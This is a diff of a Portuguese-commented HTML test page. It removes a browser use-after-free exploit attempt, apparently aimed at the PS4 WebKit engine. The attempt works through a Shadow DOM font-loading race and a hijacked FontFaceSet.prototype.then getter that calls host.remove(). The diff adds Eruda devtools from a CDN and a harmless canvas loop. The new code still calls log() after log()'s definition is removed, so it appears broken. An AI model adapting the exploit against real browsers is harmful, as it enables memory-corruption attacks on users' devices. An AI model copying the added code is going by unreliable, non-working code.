@@ -4,77 +4,44 @@
 <head><meta charset="utf-8"></head>
 <body>
 <pre id="log"></pre>
+    <!-- Carrega e inicializa o painel de desenvolvedor Eruda -->
+    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+    <script>eruda.init();</script>
 <script>
-// V5: baseado no diagnostico que CONFIRMOU o getter disparando via async
-// Agora com host.remove() para tentar o UAF real
-// Mantém execução inline (não window.onload) como no diagnostico
-
-function log(s) {
-    document.getElementById('log').textContent += s + '\n';
+function runCanvasMainThreadTest() {
+            log("[C++] Iniciando teste com Canvas normal na Main Thread...");
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                // Cria um canvas normal na memória/DOM
+                const canvas = document.createElement('canvas');
+                canvas.width = 128;
+                canvas.height = 128;
+                const ctx = canvas.getContext('2d');
+                
+                // Simula uma operação de desenho para testar o contexto
+                if (ctx) {
+                    ctx.fillStyle = "rgb(200, 0, 0)";
+                    ctx.fillRect(10, 10, 50, 50);
+                }
+                
+                setTimeout(() => {
+                    // Remove referências para simular o ciclo de vida/limpeza
+                    canvas.width = 0;
+                    canvas.height = 0;
+                }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Canvas normal iterações: ${count}`);
+                if (count > 800) {
+                    clearInterval(interval);
+                    log("Teste finalizado.");
+                }
+            }, 13);
 }
 
-// Touch antes do load event (essencial para completedLoading() settlar fonts.ready)
-document.fonts;
-
-// Setup Shadow DOM
-var host = document.createElement('div');
-document.body.appendChild(host);
-var shadow = host.attachShadow({ mode: 'open' });
-
-// DATA URL base64 longa = parse como macrotask separada (como no diagnostico)
-// Isso garante que completedLoading() dispare via caminho async → thenable check
-var pendingUrl = 'data:font/woff;base64,' + 'A'.repeat(150000);
-var style = document.createElement('style');
-style.textContent =
-    '@font-face { font-family: reentryFont; src: url("' + pendingUrl + '"); }' +
-    '.probe { font: 24px reentryFont; }';
-shadow.appendChild(style);
-
-var probe = document.createElement('span');
-probe.className = 'probe';
-probe.textContent = 'A';
-shadow.appendChild(probe);
-
-// Forca layout para iniciar o carregamento
-document.body.offsetHeight;
-document.fonts.load('24px reentryFont', 'A');
-log('status: ' + document.fonts.status);
-
-// Materializa fonts.ready (necessario para thenable assimilation)
-document.fonts.ready;
-
-// Prepend ANTES do getter (para criar pendencia UpdateType::ActiveSet)
-// NO PS4: o prepend nao faz o getter disparar de forma sincrona
-// mas cria o estado de pendencia para quando completedLoading() disparar async
-var prependedStyle = document.createElement('style');
-prependedStyle.textContent = '.unused { color: red; }';
-shadow.prepend(prependedStyle);
-log('apos prepend. status=' + document.fonts.status);
-
-// Instala getter COM host.remove() — agora que sabemos que dispara
-var getterCount = 0;
-Object.defineProperty(FontFaceSet.prototype, 'then', {
-    configurable: true,
-    get: function() {
-        delete FontFaceSet.prototype.then;
-        getterCount++;
-        log('>>> GETTER DISPAROU! count=' + getterCount);
-        log('    status no momento: ' + document.fonts.status);
-        // HOST.REMOVE() = libera no iterado → UAF se flushPendingDescendantUpdates
-        // estiver na call stack (como descrito no commit 86074ba)
-        host.remove();
-        log('    apos host.remove() — sem crash ate aqui');
-        return undefined;
-    }
-});
-
-log('getter instalado. status=' + document.fonts.status);
-log('aguardando completedLoading() async...');
-
-// Microtask checkpoint
-Promise.resolve().then(function() {
-    log('microtask: status=' + document.fonts.status + ' getter=' + getterCount);
-});
+// Executa a função de teste
+runCanvasMainThreadTest();
 </script>
 </body>
 </html>
